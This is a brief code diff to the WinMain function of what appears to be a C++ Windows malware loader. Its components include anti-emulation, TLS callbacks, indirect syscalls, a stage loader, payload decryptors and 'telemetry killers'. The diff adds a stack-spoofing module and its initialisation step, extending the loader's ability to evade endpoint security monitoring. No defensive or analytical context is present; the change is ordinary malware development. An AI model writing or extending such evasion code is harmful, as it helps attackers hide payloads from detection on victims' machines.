@@ -29,6 +29,7 @@
 #include "AntiEmul.h"
 #include "TlsCallback.h"
 #include "GadgetPool.h"
+#include "StackSpoof.h"
 #include "StageLoader.h"
 #include "GhostDecrypt.h"
 #include "NeuroDecrypt.h"
@@ -208,6 +209,11 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
     if (GlobalConfig.bIndirectSyscalls) {
         GadgetPool::Scan();
         Syscall::Init();
+    }
+
+    // ── Step 1c: Initialize Stack Spoofing ──
+    if (GlobalConfig.bStackSpoof) {
+        StackSpoof::Init();
     }
 
     // ── Step 2: Telemetry Killers ──
